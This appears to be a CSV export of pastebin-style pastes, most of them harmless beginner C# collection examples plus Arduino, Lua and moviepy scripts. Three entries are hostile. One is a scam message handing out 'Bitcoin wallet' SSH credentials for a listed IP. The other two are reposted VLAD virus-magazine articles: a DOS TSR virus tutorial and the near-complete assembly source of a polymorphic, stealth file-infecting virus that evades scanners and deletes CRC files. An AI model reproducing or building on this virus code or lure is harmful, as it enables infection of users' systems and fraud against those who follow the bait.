id,title,username,language,date,content
CRjJQ09E,Queue,iumar69,C#,Friday 30th of June 2023 12:10:41 AM CDT,"using System;
using System.Collections;
 
class Program
{
    public static void Main()
    {
        Queue q = new Queue();
        q.Enqueue('u');
        q.Enqueue(""Umar"");
        q.Enqueue(34.31);
        q.Enqueue(32);
        q.Enqueue(true);
 
        Console.WriteLine(""The Number  of elements in the Queue are :"" + q.Count +"" And the elements are:"");
 
        foreach (var items in q)
        {
            Console.Write(items+"" "");
        }
 
        ArrayList al = new ArrayList();
 
 
    }
}
 "
nU9YBZwq,SortedList,iumar69,C#,Friday 30th of June 2023 12:10:01 AM CDT,"using System;
using System.Collections;
using System.Data;

class Program
{
    public static void Main()
    {
       SortedList sl = new SortedList();
        sl.Add(1, ""Mercury"");
        sl.Add(2, ""Venus"");
        sl.Add(3, ""Earth"");
        sl.Add(4, ""Mars"");
        sl.Add(5, ""Venus"");
        sl.Add(6, ""Jupiter"");
        sl.Add(7, ""saturn"");

        foreach(DictionaryEntry e in sl)
        {
            Console.WriteLine(e.Key+"" ""+e.Value);
        }
        Console.ReadLine();

    }
}


"
jSYHwPHk,Hashtable,iumar69,C#,Friday 30th of June 2023 12:06:25 AM CDT,"using System;
using System.Collections;
using System.Data;

class Program
{
    public static void Main()
    {
        Hashtable ht = new Hashtable();
        ht.Add(""Delhi"", ""India"");
        ht.Add(""Kathmandu"", ""Nepal"");
        ht.Add(""Greece"", ""Athens"");
        ht.Add(""Japan"", ""Tokyo"");
        ht.Add(""China"", ""Japan"");

        foreach(DictionaryEntry items in ht)
        {
            Console.WriteLine(items.Key + ""-"" + items.Value);
        }
        Console.ReadLine();
    }
}
"
YnmJEZ37,BTC Wallet Credentials have been reset,windpspell_53,GetText,Friday 30th of June 2023 12:05:29 AM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
spoznajniq8:K8tX4P on 45.9.148.244
You can connect via SSH or use an online client such as ssheasy.com.
Regards"
T9F0W7VN,Cutting clips from tv episodes,mdmsd2,Python,Thursday 29th of June 2023 11:58:19 PM CDT,"import os  # importing os module for interacting with operating system
import random  # importing random module for generating random values
from moviepy.editor import *  # importing necessary classes from moviepy module
from moviepy.video.VideoClip import TextClip

# creating a list of .mp4 files in the 'Episodes' directory using list comprehension
mp4_files = [file for file in os.listdir('Episodes') if file.endswith('.mp4')]
# randomly choosing a file from the list
random_file = random.choice(mp4_files)
# creating the full path of the chosen video file
video_file = os.path.join('Episodes', random_file)
# loading the video file using VideoFileClip() class
video = VideoFileClip(video_file)
# getting the duration of the video
duration = video.duration
# choosing a random start time between 30 seconds and 60 seconds before the end of the video
start = random.uniform(30, max(30, duration - 60))
# choosing a random length between 20 seconds and 40 seconds
lenght = random.randint(20, 40)
# extracting the clip from the video using the chosen start time and length
clip = video.subclip(start, start + lenght)
# getting the width and height of the clip
width, height = clip.size
# calculating the aspect ratio of the clip
aspect_ratio = width / height
# calculating the new width of the clip with a 16:9 aspect ratio
new_width = int(height * 9/16)
# calculating the left margin to center the clip horizontally
left_margin = (width - new_width) / 2
# cropping the clip to the new width and centering it horizontally
clip = clip.crop(x1=left_margin, x2=left_margin + new_width)
# increasing the speed of the clip by 10%
clip = clip.speedx(factor=1.1)
# flipping the clip horizontally
clip = clip.fx(vfx.mirror_x)
# creating a TextClip object with the desired text and properties
text = ""Surprise in comments\nEnter & WIN!""
txt_clip = TextClip(text, fontsize=15, color='white', font='Arial-Bold')
# setting the position of the text clip to be centered near the bottom of the screen
txt_clip = txt_clip.set_position(('center', 0.8), relative=True)
# creating a CompositeVideoClip object by combining the clip and text clip
final_clip = CompositeVideoClip([clip, txt_clip])
# setting the duration of the final clip to be the same as the cropped clip
final_clip.duration = clip.duration
# writing the final clip to a file named 'clip.mp4'
final_clip.write_videofile(""clip.mp4"")
"
4qA14ghr,ArrayList characters Display reversed,iumar69,C#,Thursday 29th of June 2023 11:53:09 PM CDT,"
using System;
using System.Collections;

class Program
{
    public static void Main()
    {
       ArrayList array = new ArrayList();   
        array.Add('z');
        array.Add('o');
        array.Add('r');
        array.Add('i');
        array.Add('f');

        for(int i=array.Count-1; i>=0; i--)
        {
            var item = array[i];
            Console.Write(item+"" "");
        }
        Console.ReadLine();
    }
}
"
D2xDsYte,ArrayList String,iumar69,C#,Thursday 29th of June 2023 11:43:05 PM CDT,"
using System;
using System.Collections;

class Program
{
    public static void Main()
    {
       ArrayList array = new ArrayList();   
        array.Add(""First"");
        array.Add(""Second"");
        array.Add(""Third"");
        array.Add(""Fourth"");

        Console.WriteLine(""The elements of the array are:"");
        foreach(var items in array)
        {
            Console.Write(items+"" "");
        }
        Console.ReadLine();
    }
}"
Mn3HvhtG,Auto Range OD Setup,ScienceGeyser,Arduino,Thursday 29th of June 2023 11:40:10 PM CDT,"// Auto Range OD Setup
//
#define R1_LED 2
#define R2_LED 3
#define SENSE_INPUT A0
#define REF_V 5 // Default Reference Voltage for Uno R3
#define READ_DELAY 250 // microseconds quiet time before analogRead
int analogVal = 0;
int gainVal = 1;
float analogVoltage = 0;

void setup(){
  Serial.begin(115200);
  pinMode(LED_BUILTIN, OUTPUT);
  pinMode(R1_LED, INPUT); // Puts pin in HI-Z mode
  pinMode(R2_LED, INPUT); // Puts pin in HI-Z mode
}

void loop(){
  pinMode(R2_LED, INPUT); // Puts pin in HI-Z mode
  pinMode(R1_LED, OUTPUT);// Puts pin in LOW state and turns on LED at low current
  gainVal = 1;
  delayMicroseconds(READ_DELAY);
  analogVal=analogRead(SENSE_INPUT);
  if(analogVal<100){
    pinMode(R1_LED, INPUT); // Puts pin in HI-Z mode
    pinMode(R2_LED, OUTPUT);// Puts pin in LOW state and turns on LED at high current
    gainVal = 5;
    delayMicroseconds(READ_DELAY);
    analogVal=analogRead(SENSE_INPUT);
  }
  analogVoltage=analogVal*(REF_V/1023);
  Serial.print(analogVal);
  Serial.print("", "");
  Serial.println(gainVal);
}

bool cycleTime1(bool setVal, unsigned long valMicros){
  if(setVal){ // initialize
    // initialize
    tStart = micros();
    return false
  }else{ // run
    // run
    if(micros()-valMicros>tStart){
      return true;
    }else{
      return false;
    }
  }
}

void exitation(bool state, int intensity){
  switch(intensity){
    case 1:
    pinMode(R2_LED, INPUT); // Puts pin in HI-Z mode
    pinMode(R1_LED, OUTPUT);// Puts pin in LOW state
    digitalWrite(R1_LED, LOW);// Ensures LOW state on pin
    break;
    case 2:
    pinMode(R1_LED, INPUT); // Puts pin in HI-Z mode
    pinMode(R2_LED, OUTPUT);// Puts pin in LOW state
    digitalWrite(R2_LED, LOW);// Ensures LOW state on pin
    break;
    case 3:
    pinMode(R1_LED, OUTPUT);// Puts pin in LOW state
    pinMode(R2_LED, OUTPUT);// Puts pin in LOW state
    digitalWrite(R1_LED, LOW);// Ensures LOW state on pin
    digitalWrite(R2_LED, LOW);// Ensures LOW state on pin
    break;
    default:
    pinMode(R1_LED, INPUT); // Puts pin in HI-Z mode
  	pinMode(R2_LED, INPUT); // Puts pin in HI-Z mode
	break;
}"
CN1ftypr,Queue Collection,iumar69,C#,Thursday 29th of June 2023 11:39:06 PM CDT,"using System;
using System.Collections;

class Program
{
    public static void Main()
    {
        Queue q = new Queue();
        q.Enqueue('u');
        q.Enqueue(""Umar"");
        q.Enqueue(34.31);
        q.Enqueue(32);
        q.Enqueue(true);

        Console.WriteLine(""The Number  of elements in the Queue are :"" + q.Count +"" And the elements are:"");

        foreach (var items in q)
        {
            Console.Write(items+"" "");
        }

        ArrayList al = new ArrayList();


    }
}
"
bKcEq2MC,unit.lua,tigres810,Lua,Thursday 29th of June 2023 10:35:41 PM CDT,"local sounds = require(""__base__.prototypes.entity.sounds"");

local testunit = {
  type = ""unit"",
  name = ""pig"",
  icon = ""__TestMod__/graphics/icons/testunit.png"",
  icon_size = 64,
  flags = {""placeable-player"", ""placeable-enemy"", ""placeable-off-grid"", ""breaths-air"", ""not-repairable""},
  max_health = 50,
  order = ""b-b-a"",
  subgroup = ""enemies"",
  healing_per_tick = 0.01,
  collision_box = {{-0.3, -0.3}, {0.3, 0.3}},
  selection_box = {{-0.5, -1.5}, {0.5, 0.5}},
  attack_parameters =
  {
    type = ""projectile"",
    ammo_category = ""melee"",
    ammo_type = make_unit_melee_ammo_type(20),
    cooldown = 35,
    damage_modifier = 1,
    projectile_center = {0, 1},
    projectile_creation_distance = 0.6,
    range = 1,
    sound = sounds.biter_roars(0.4),
    animation = biterattackanimation(0.5, {r = 1, g = 1, b = 1, a = 1}, {r = 1, g = 1, b = 1, a = 1})
  },
  vision_distance = 30,
  movement_speed = 0.2,
  distance_per_frame = 0.1,
  pollution_to_join_attack = 200,
  distraction_cooldown = 300,
  min_pursue_time = 10 * 60,
  max_pursue_distance = 50,
  corpse = ""medium-biter-corpse"",
  dying_explosion = ""blood-explosion-small"",
  working_sound = sounds.biter_calls(0.4),
  dying_sound = sounds.biter_dying(0.9),
  run_animation =
  {
    layers =
    {
      {
        filenames = {
          ""__TestMod__/graphics/unit/pig-01.png"",
          ""__TestMod__/graphics/unit/pig-02.png"",
          ""__TestMod__/graphics/unit/pig-03.png"",
          ""__TestMod__/graphics/unit/pig-04.png"",
        },
        slice = 4,
        lines_per_file = 4,
        width = 238,
        height = 134,
        frame_count = 4,
        direction_count = 4,
        line_length = 4,
        animation_speed = 0.4,
        scale = 0.5
      }
    }
  },
  friendly = false,
  call_for_help_radius = 0
}

data:extend({
    testunit
})"
jrUu3Bra,VLAD Magazine - Issue #2 - ARTICLE.3_2 - A Guide To TSR,FlyFar,Email,Thursday 29th of June 2023 10:28:50 PM CDT," TSR tutorial!
   +-----------+

   Of course when first learning to do something you must start from
   the very beginning, writing a TSR virus comes roundabout after the
   parasitic stage.  If you can't do this, then I suggest you study up
   on it before checking this out :).  According to some releasing, even
   a parasitic infector is lame, so heh... I guess this might come in
   handy for someone.

   Ok, well here goes the tutorial:

      
   When a program is loaded, the memory around it looks like this:


           |                      |
           |                      |
           | This is the EXE/COM  |
           | Program that is      |
           | infected.            |
           |______________________|
           |Program Segment Prefix|
           | (Shortened to PSP)   |   This is 100H bytes long.(256 bytes)
           |______________________|
           | Memory Control Block |
           |  (Shortened to MCB)  |   This is 10H bytes long. (16 bytes)
           |______________________|

      
   On entry to both COM and EXE files DS and ES contain the segment of the
   PSP (Program Segment Prefix).

      To get the MCB (Memory Control Block) we go:

        mov     ax,ds           ;DS=PSP
        dec     ax
        mov     ds,ax           ;Now DS=MCB

   This is because the MCB hides one paragraph (paragraph=16 bytes) below
   the PSP.  The MCB is what DOS uses to allocate memory.
     
        MCB Format
      ;******************
      DS:[0] = MCB Type.              - Either Z or M block.
      DS:[3] = Size of block / 16.  
      ;******************

      Next go:

        cmp     ds:[0],'Z'      ;We want a Z block because Z are the last.
        jne     fuck_off
        
        sub     ds:[3],memory_we_want/16
                                ;Now DOS thinks it has less memory. So we put
                                ;the virus in the gap.

   In the PSP at position 2 is the segment address of the top of memory.
   To save us calculating it from the MCB it is much easier to manipulate
   this data.  So:

        sub     ds:[12h],memory_we_want/16

        ;DS:[12h] now contains the segment where we put our virus.

        mov     ax,word ptr ds:[12h]
        mov     es,ax                   ;ES=Place to put virus.

        push    cs
        pop     ds                      ;DS=CS
        xor     di,di
        ;We assume SI=Start of virus.
        mov     cx,virus_length         ;How many bytes to move.
        
        rep     movsb                   ;Move CX bytes from DS:SI to ES:DI
        ;That should move your virus to the TOM (top of memory)
     
   I have started rushing here.  Not too fast I hope.  Now what you have
   to do is point your interrupt (int21h) at the handler within your virus.

   Setting the interrupt vector manually (without using int21h) is best
   because then you can infect COMMAND.COM safely.  Anyway, the interrupt
   vector table is located at segment 0.

        xor     ax,ax           ;Zero AX
        mov     ds,ax           ;DS=0=Interrupt Vector table.

   All interrupts are located at their number multiplied by four.  They
   are laid down with the offset first and then the segment.

        mov     ds:[21h*4],offset int21handler  ;Offset of virus routine
        mov     ds:[21h*4+2],es                 ;Segment of virus routine

   This code will set int21h to run your virus handler.  But before
   putting your virus in memory you should save the original Offset:Segment
   in your handler so that you can return to it later on.

   Your handler should look like this:

        int21handler proc far
          cmp   ah,3dh                  ;This is file open.
          jne   go_int
          push  everything
          do infection and shit
          pop   everything
        go_int:
          db    0eah                    ;This stands for jmpf
          dw    orig_int21_offset
          dw    orig_int21_segment
          int21handler endp

   There's also other stuff like checking for residency where you pass
   into int 21h a unique register pattern and test for it and return another
   weird pattern to confirm its residency.  But I'm sure you'll work it out.

   Ok, that'll do for another lame tutorial by Quark.  Look out for more
   lame tutorials, believe me, there'll be many! :)
   (With intro by Metabolic)"
iBxcRsz3,VLAD Magazine - Issue #2 - ARTICLE.4_2 - VLAD Virus Source Code,FlyFar,ASM (NASM),Thursday 29th of June 2023 10:04:18 PM CDT,";               The VLAD virus!
;               +-------------+

;                                               by Qark/VLAD!


;       OVL files... never again!  I give this piece of advice to anyone.
; By avoiding the infection of OVL's your virus may spread for long times
; without discovery.  Otherwise everything crashes... ok, not everything
; but some large application programs do and that certainly makes people
; suspicious.  Don't do it!
  
;       WoW!  My first ever polymorphic virus!  Yay! We'll see how it does.
; My goal is to make it so that there is no longer a signature and you'll
; need an algorithm to find it... but some lines of code can't really be
; switched with others so I face a bit of a dilemma.  My code has stood up
; to all the tests I've done on it so far... so we'll see.

;       According to my calculations there are a few million variations on
; this sucker. I have gotten it to the point that there are only seven bytes
; that remain the same.  Not too bad...

;       This virus is completely optimised.  Every routine has been stripped 
; to the barest minimum.  (Unlike Daddy in my last release).  It even passed
; the 'TZ' test.  He only managed to strip five bytes off this sucker.

; Features:  Doesn't infect EXE files that use internal overlays.
;            Doesn't get flagged under heuristics.
;            Deletes CRC checking files.
;            Findfirst/Findnext stealth.
;            Directory listing stealth.
;            Uses the DOS qualify function to fix-up the filename.
;               (This is a pretty good new feature... uppercase, full path
;                and it's smaller than a REP MOVSB!)
;            Int24h handler to stop write protect errors on floppys.
;            Doesn't infect SCAN*.*, TB*.*, F-PR*.* and DV.E*
;            Uses SFT's to bypass some DOS functions.
;            Infects readonly files without changing their attribute.
;            Slightly polymorphic (Seven stable bytes)
;            Doesn't infect COM files that are too big or small.
 
;       Assemble using a86.



	org     0

	db      0beh                    ;Stands for MOV SI,xxxx
delta   dw      100h                    ;We'll put the data offset in.

	db      0b0h                    ;Stands for MOV AL,xxxx
encryptor       db      0               ;The encryption byte.

poly6:
	add     si,offset enc_start     ;Point to the bit to encrypt.


	call    encrypt                 ;Decrypt the file.

enc_start:                              ;Everything after this point
					;has been encrypted.

	sub     si,offset enc_end       ;Restore SI.

	;mov     word ptr [si+offset quit],20cdh
	db      0c7h,44h
	db      offset quit
	dw      20cdh
quit:                
	mov     word ptr [si+offset quit],44c7h
					;Install the TSR now.
	push    bx
	push    cx
	push    ds
	push    es
	push    si

	mov     ax,0CAFEh               ;Eat here.
	int     21h

	cmp     ax,0F00Dh               ;Is there any of this ?
	je      bad_mem_exit            ;Yep!  Time for lunch! No viral
					;activity today!

	mov     ax,es                   ;ES = PSP
	dec     ax
	mov     ds,ax                   ;DS=MCB segment

	cmp     byte ptr [0],'Z'        ;Z=last MCB
	jne     bad_mem_exit
	
	sub     word ptr [3],160        ;160*16=2560 less memory
	sub     word ptr [12h],160      ;[12h] = PSP:[2] = Top of memory
	mov     ax,word ptr [12h]
;------------------------------
	push    cs
	pop     ds                      ;DS=CS

	xor     bx,bx                   ;ES=0
	mov     es,bx

	mov     bx,word ptr es:[132]    ;get int21h

	mov     word ptr [si+offset i21],bx

	mov     bx,word ptr es:[134]    ;get int21h
	mov     word ptr [si+offset i21 + 2],bx

;------------------------------

	mov     es,ax                   ;Store our stuff in here...

	xor     di,di
	mov     cx,offset length
	rep     movsb                   ;Move the Virus to ES:DI
;------------------------------
	
	xor     bx,bx                   ;ES=0
	mov     ds,bx

	mov     word ptr [132],offset infection
	mov     word ptr [134],ax
	
bad_mem_exit:

	pop     si
	pop     es
	pop     ds
	pop     cx
	pop     bx

	cmp     byte ptr [si+offset com_exe],1
	je      Exe_Exit

	mov     ax,word ptr [si+offset old3]
	mov     word ptr [100h],ax
	mov     al,byte ptr [si+offset old3+2]
	mov     [102h],al
	
	mov     ax,100h
	jmp     ax


Exe_exit:

	mov     ax,es                           ;ES=PSP
	add     ax,10h                          ;PSP+10H = start of actual
						;exe file.
	
	add     word ptr [si+jump+2],ax         ;Fix jump for original CS.
	
	mov     sp,word ptr [si+offset orig_sp]
	add     ax,word ptr [si+offset orig_ss] ;Fix segment with AX.
	mov     ss,ax

	push    es
	pop     ds

	xor     si,si
	xor     ax,ax

	db      0eah
	jump    dd      0


	db      '[VLAD virus]',0
	db      'by VLAD!',0


infection       proc    far
	
	push    ax                      ;Save AX

	xchg    ah,al                   ;Swap AH,AL

	cmp     al,4bh                  ;Cmp AL,xx is smaller than AH
	je      test_file               ;Thanx TZ! :)
	cmp     al,43h
	je      test_file
	cmp     al,56h
	je      test_file
	cmp     ax,006ch
	je      test_file
	cmp     al,3dh
	je      test_file
	
	cmp     al,11h                  ;Do directory stealth.
	je      dir_listing
	cmp     al,12h
	je      dir_listing

	cmp     al,4eh                  ;Find_first/Find_next stealth.
	je      find_file
	cmp     al,4fh
	je      find_file
	
	pop ax

	cmp     ax,0CAFEh               ;Where I drink coffee!
	jne     jump1_exit

	mov     ax,0F00Dh               ;What I eat while I'm there.

	iret

dir_listing:
	jmp     dir_stealth
find_file:
	jmp     search_stealth
jump1_exit:        
	
	jmp     jend        
	
test_file:

	push    bx
	push    cx
	push    dx
	push    ds
	push    es
	push    si
	push    di

	cmp     al,6ch
	jne     no_fix_6c

	mov     dx,si

no_fix_6c:

	mov     si,dx                   ;DS:SI = Filename.

	push    cs
	pop     es                      ;ES=CS

	mov     ah,60h                  ;Get qualified filename.
	mov     di,offset length        ;DI=Buffer for filename.
	call    int21h                  ;This converts it to uppercase too!

					;CS:LENGTH = Filename in uppercase
					;with path and drive.  Much easier
					;to handle now!

	push    cs
	pop     ds                      ;DS=CS

	mov     si,di                   ;SI=DI=Offset of length.

	cld                             ;Clear direction flag.

find_ascii_z:

	lodsb
	cmp     al,0
	jne     find_ascii_z

	sub     si,4                    ;Points to the file extension. 'EXE'

	lodsw                           ;Mov AX,DS:[SI]

	cmp     ax,'XE'                 ;The 'EX' out of 'EXE'
	jne     test_com
	
	lodsb                           ;Mov AL,DS:[SI]

	cmp     al,'E'                  ;The last 'E' in 'EXE'
	jne     jump2_exit

	jmp     do_file                 ;EXE-file

test_com:

	cmp     ax,'OC'                 ;The 'CO' out of 'COM'
	jne     jump2_exit

	lodsb                           ;Mov AL,DS:[SI]

	cmp     al,'M'
	je      do_file                 ;COM-file
	
jump2_exit:
	jmp     far_pop_exit            ;Exit

Do_file:

	call    chk4scan
	jc      jump2_Exit
	
	mov     ax,3d00h                ;Open file.
	mov     dx,di                   ;DX=DI=Offset length.
	call    int21h

	jc      jump2_exit

	mov     bx,ax                   ;File handle into BX.

	call    get_sft                 ;Our SFT.

					;Test for infection.
	mov     ax,word ptr es:[di+0dh] ;File time into AX from SFT.
	mov     word ptr es:[di+2],2    ;Bypass Read only attribute.
	and     ax,1f1fh                ;Get rid of the shit we don't need.
	cmp     al,ah                   ;Compare the seconds with minutes.
	je      jump2_exit

	push    cs
	pop     es                      ;ES=CS

	call    del_crc_files
					;Read the File header in to test
					;for EXE or COM.

	mov     ah,3fh                  ;Read from file.
	mov     cx,1ch                  ;1C bytes.
	call    int21h                  ;DX=Offset length from del_crc_files
					;We don't need the filename anymore
					;so use that space as a buffer.

	;Save int24h and point to our controller.

	xor     ax,ax
	mov     es,ax

	push    word ptr es:[24h*4]     ;Save it.
	push    word ptr es:[24h*4+2]

	mov     word ptr es:[24h*4],offset int24h
	mov     word ptr es:[24h*4+2],cs        ;Point it!

	push    cs
	pop     es
	
	mov     si,dx                   ;SI=DX=Offset of length.

	mov     ax,word ptr [si]        ;=Start of COM or EXE.
	add     al,ah                   ;Add possible MZ.
	cmp     al,167                  ;Test for MZ.
	je      exe_infect
	jmp     com_infect

EXE_Infect:

	mov     byte ptr com_exe,1      ;Signal EXE file.

	cmp     word ptr [si+1ah],0     ;Test for overlays.
	jne     exe_close_exit          ;Quick... run!!!

	push    si                      ;SI=Offset of header

	add     si,0eh                  ;SS:SP are here.
	mov     di,offset orig_ss
	movsw                           ;Move them!
	movsw

	mov     di,offset jump          ;The CS:IP go in here.

	lodsw                           ;ADD SI,2 - AX destroyed.

	movsw
	movsw                           ;Move them!
	
	pop     si

	call    get_sft                 ;ES:DI = SFT for file.

	mov     ax,word ptr es:[di+11h] ;File length in DX:AX.
	mov     dx,word ptr es:[di+13h]
	mov     cx,16                   ;Divide by paragraphs.
	div     cx

	sub     ax,word ptr [si+8]      ;Subtract headersize.

	mov     word ptr delta,dx       ;Initial IP.

	mov     word ptr [si+14h],dx    ;IP in header.
	mov     word ptr [si+16h],ax    ;CS in header.

	add     dx,offset stack_end     ;Fix SS:SP for file.

	mov     word ptr [si+0eh],ax    ;We'll make SS=CS
	mov     word ptr [si+10h],dx    ;SP=IP+Offset of our buffer.

	
	mov     ax,word ptr es:[di+11h] ;File length in DX:AX.
	mov     dx,word ptr es:[di+13h]

	add     ax,offset length        ;Add the virus length on.
	adc     dx,0                    ;32bit

	mov     cx,512                  ;Divide by pages.
	div     cx

	and     dx,dx
	jz      no_page_fix

	inc     ax                              ;One more for the partial
						;page!
no_page_fix:

	mov     word ptr [si+4],ax              ;Number of pages.
	mov     word ptr [si+2],dx              ;Partial page.

	mov     word ptr es:[di+15h],0          ;Lseek to start of file.
	
	call    get_date                        ;Save the old time/date.

	mov     ah,40h                          ;Write header to file.
	mov     dx,si                           ;Our header buffer.
	mov     cx,1ch                          ;1CH bytes.
	call    int21h

	jc      exe_close_exit

	mov     ax,4202h                        ;End of file.  Smaller than
						;using SFT's.
	xor     cx,cx                           ;Zero CX
	cwd                                     ;Zero DX (If AX < 8000H then
						;CWD moves zero into DX)
	call    int21h

	call    enc_setup                       ;Thisll encrypt it and move
						;it to the end of file.
	
exe_close_exit:

	jmp     com_close_exit

COM_Infect:

	mov     byte ptr com_exe,0      ;Flag COM infection.

	mov     ax,word ptr [si]        ;Save COM files first 3 bytes.
	mov     word ptr old3,ax
	mov     al,[si+2]
	mov     byte ptr old3+2,al

	call    get_sft                 ;SFT is at ES:DI

	mov     ax,es:[di+11h]          ;AX=File Size
	
	cmp     ax,64000
	ja      com_close_exit          ;Too big.

	cmp     ax,1000
	jb      com_close_exit          ;Too small.

	push    ax                      ;Save filesize.
	
	mov     newoff,ax               ;For the new jump.
	sub     newoff,3                ;Fix the jump.

	mov     word ptr es:[di+15h],0  ;Lseek to start of file :)

	call    get_date                ;Save original file date.

	mov     ah,40h
	mov     cx,3
	mov     dx,offset new3          ;Write the virus jump to start of
	call    int21h                  ;file.

	pop     ax                      ;Restore file size.
	
	jc      com_close_exit          ;If an error occurred... exit.

	mov     word ptr es:[di+15h],ax ;Lseek to end of file.

	add     ax,100h                 ;File size + 100h.
	mov     word ptr delta,ax       ;The delta offset for COM files.

	call    enc_setup

com_close_exit:

	mov     ah,3eh
	call    int21h

	;restore int24h

	xor     ax,ax
	mov     es,ax

	pop     word ptr es:[24h*4+2]
	pop     word ptr es:[24h*4]


far_pop_exit:

	pop     di
	pop     si
	pop     es
	pop     ds
	pop     dx
	pop     cx
	pop     bx

	pop     ax

jend:
	db      0eah                    ;Opcode for jmpf
	i21     dd      0


;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
;$$              PROCEDURES       AND          DATA                      $$
;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$


int21h  proc    near                    ;Our int 21h
	pushf
	call    dword ptr cs:[i21]
	ret
int21h  endp

int24h  proc    near
	mov     al,3
	iret
int24h  endp

Search_Stealth:

	pop     ax              ;Restore AX.
	
	call    int21h
	jc      end_search

	push    es
	push    bx
	push    si
	
	mov     ah,2fh
	call    int21h

	mov     si,bx

	mov     bx,word ptr es:[si+16h]
	and     bx,1f1fh
	cmp     bl,bh
	jne     search_pop                         ;Is our marker set ?

	sub     word ptr es:[si+1ah],offset length ;Subtract the file length.
	sbb     word ptr es:[si+1ch],0

search_pop:
	pop     si
	pop     bx
	pop     es
	clc
end_search:
	retf     2                      ;This is the same as an IRET
					;except that the flags aren't popped
					;off so our Carry Remains set.




Dir_Stealth:

	;This bit means that when you do a 'dir' there is no change in
	;file size.

	pop     ax

	call    int21h                          ;Call the interrupt
	cmp     al,0                            ;straight off.
	jne     end_of_dir

	push    es
	push    ax                              ;Save em.
	push    bx
	push    si

	mov     ah,2fh                          ;Get DTA address.
	call    int21h

	mov     si,bx
	cmp     byte ptr es:[si],0ffh           ;Extended FCB ?
	jne     not_extended

	add     si,7                            ;Add the extra's.

not_extended:
	
	mov     bx,word ptr es:[si+17h]         ;Move time.
	and     bx,1f1fh
	cmp     bl,bh
	jne     dir_pop                         ;Is our marker set ?
	
	sub     word ptr es:[si+1dh],offset length ;Subtract the file length.
	sbb     word ptr es:[si+1fh],0

dir_pop:

	pop     si
	pop     bx
	pop     ax
	pop     es

end_of_dir:

	iret


Get_Date        proc    near
;Saves the date into DATE and TIME.

	mov     ax,5700h                ;Get Date/Time.
	call    int21h
	mov     word ptr time,cx
	mov     word ptr date,dx
	
	ret
Get_Date        endp

	time    dw      0
	date    dw      0

Set_marker      proc    near
;Sets the time back and changes the time into an infection marker.

	mov     cx,time
	mov     al,ch
	and     al,1fh
	and     cl,0e0h
	or      cl,al
	mov     dx,date
	mov     ax,5701h
	call    int21h
		
	ret

Set_marker      endp

PolyMorphic     Proc    Near
;Moves random instructions into the code.

	in      ax,40h                  ;Random in AX
	and     ax,6                    ;Between 0-3 * 2
	mov     di,offset enc_loop      ;Put the xor in a random position.
	add     di,ax                   
	mov     word ptr [di],0430h     ;=XOR [SI],AL

	mov     dx,di                   ;Already done this position

	mov     di,offset poly1         ;Put the random instruction here.
	
	mov     cx,3                    ;3 random instructions.

poly_enc_loop:
	
	in      ax,40h                  ;Random number in AX.
	and     ax,14                   ;Between 0-7.  Multiplied by 2.
					;14 = 00001110b
	mov     si,offset database1     ;SI points to start of database.
	add     si,ax                   ;Add SI with AX the random offset.

	cmp     dx,di                   ;Is the XOR here ?
	jne     poly_move               ;Nope its ok.

	inc     di                      ;Dont move where the XOR is!
	inc     di
poly_move:
	movsw                           ;Move the instruction.
	loop    poly_enc_loop
	
Poly_CX:
	;This time we are randomising the 'MOV CX,' in the encryption
	;routine with some POPs.

	in      ax,40h                  ;Random number in AX.
	and     ax,3                    ;0-3
	cmp     ax,3
	je      poly_cx                 ;We only have 3 combinations to
					;choose from so retry if the fourth
					;option gets choosen.
	
	xchg    al,ah                   ;Swap em for AAD.
	aad                             ;Multiply AH by 10(decimal).
	shr     al,1                    ;Divide by 2.
					;The overall effect of this is
					;MUL AX,5  We need this because
					;we have to move 5 bytes.
	
	mov     si,offset database2
	add     si,ax                   
	mov     di,offset poly5         ;Where to put the bytes.
	movsw                           ;Move 5 bytes
	movsw
	movsb

	in      ax,40h                  ;Rand in AX.
	and     ax,12                   ;0-3*4
	mov     si,offset database3
	add     si,ax
	mov     di,offset poly6
	movsw
	movsw

	in      ax,40h
	and     ax,2
	mov     si,offset database4
	add     si,ax
	mov     di,offset poly7
	movsw

	in      ax,40h
	and     ax,2
	mov     si,offset database5
	add     si,ax
	mov     di,offset poly8
	movsw
	
	ret
	
	db      '[VIP v0.01]',0

PolyMorphic     EndP

database1       db      0f6h,0d0h               ;not al         2 bytes
		db      0feh,0c0h               ;inc al         2 bytes
		db      0f6h,0d8h               ;neg al         2 bytes
		db      0feh,0c8h               ;dec al         2 bytes
		db      0d0h,0c0h               ;rol al,1       2 bytes
		db      04h,17h                 ;add al,17h     2 bytes
		db      0d0h,0c8h               ;ror al,1       2 bytes
		db      2ch,17h                 ;sub al,17h     2 bytes

database2:      ;Three variations on the one routine within encrypt.
		mov     cx,offset enc_end - offset enc_start
		push    cs
		pop     ds
		
		push    cs
		pop     ds
		mov     cx,offset enc_end - offset enc_start

		push    cs
		mov     cx,offset enc_end - offset enc_start
		pop     ds

database3:      ;Four variations of the routine at the start of the virus.

	add     si,offset enc_start + 1
	dec     si
	
	dec     si
	add     si,offset enc_start +1
	
	add     si,offset enc_start -1
	inc     si
	
	inc     si
	add     si,offset enc_start -1

database4:                      ;This is for the INC SI in the encryption.
	inc     si
	cld
	cld
	inc     si

database5:                      ;This is for the RET in the encryption.
	ret
	db      0fh
	cld
	ret

Enc_Setup       proc    near

	push    cs
	pop     es
	
	call    polymorphic             ;Our polymorphic routine.

	inc     byte ptr encryptor      ;Change the encryptor.
	jnz     enc_not_zero            ;Test for zero.
					;XOR by Zero is the same byte.
	inc     byte ptr encryptor

enc_not_zero:

	xor     si,si
	mov     di,offset length        ;Offset of our buffer.
	mov     cx,offset length        ;Virus Length.
	rep     movsb                   ;Move the virus up in memory for
					;encryption.
	mov     al,byte ptr encryptor
	mov     si,offset length + offset enc_start

	call    encrypt                 ;Encrypt virus.

	mov     ah,40h                  ;Write virus to file
	mov     dx,offset length        ;Buffer for encrypted virus.
	mov     cx,offset length        ;Virus length.
	call    int21h

	call    set_marker              ;Mark file as infected.

	ret
Enc_Setup       endp

Get_SFT Proc    Near
;Entry:  BX=File Handle.
;Exit:   ES:DI=SFT.

	push    bx

	mov     ax,1220h        ;Get Job File Table Entry.  The byte pointed
	int     2fh             ;at by ES:[DI] contains the number of the
				;SFT for the file handle.

	xor     bx,bx
